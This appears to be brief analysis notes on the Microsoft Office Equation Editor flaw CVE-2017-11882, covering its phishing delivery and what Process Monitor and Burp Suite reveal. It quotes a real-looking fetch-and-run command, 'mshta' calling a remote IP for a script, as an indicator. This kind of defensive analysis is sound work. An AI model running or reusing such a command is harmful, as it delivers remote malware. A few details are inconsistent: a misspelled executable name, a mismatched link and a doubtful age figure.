# Microsoft Office Memory Corruption (CVE-2017-11882)
### Background
* __Age__: 17 year old vulnerability
* __What is it__: Run arbitrary code remotely without user interaction
* __Why it works__: Buffer overflow vulnerability inside equation editor (EQUEDT32.exe)
* __Who has been affected__: Users who installed
  * Microsoft Office 2007 Service Pack 3
  * Microsoft Office 2010 Service Pack 2 
  * Microsoft Office 2013 Service Pack 1 
  * Microsoft Office 2016
* __CVSS__:
  * The Common Vulnerability Scoring System
  * The score is 7.8 (high)
  * Really dangerous & should be fixed ASAP

### It always starts from the internet phishing...
1.	A spam __email__
2.	An __attachment__
3.	A __.doc file__ in Rich Text Format (RTF)
4.	__Microsoft Office__ will automatically open it

### Process Monitor
It is an [advanced monitoring tool for Windows](https://nvd.nist.gov/vuln-metrics/cvss).  
It is used to monitor and display all the activities of file system in real-time. [reference 1](https://en.wikipedia.org/wiki/Process_Monitor)  
* Unexpected operation named 'EQNEDT32.EXE'
* Command line has been called
* (Very like) a malicious host - 'mshta http://104.254.99.77/x.txt' 


### Burp Suite
It is a [web vulnerability scanner](https://portswigger.net/burp).  
It is a set of tools used for penetration testing of web applications. [reference 2](https://www.geeksforgeeks.org/what-is-burp-suite/g)  
* Unexpected 'GET' request 
* (Very like) a malicious host - 'mshta http://104.254.99.77/x.txt' 
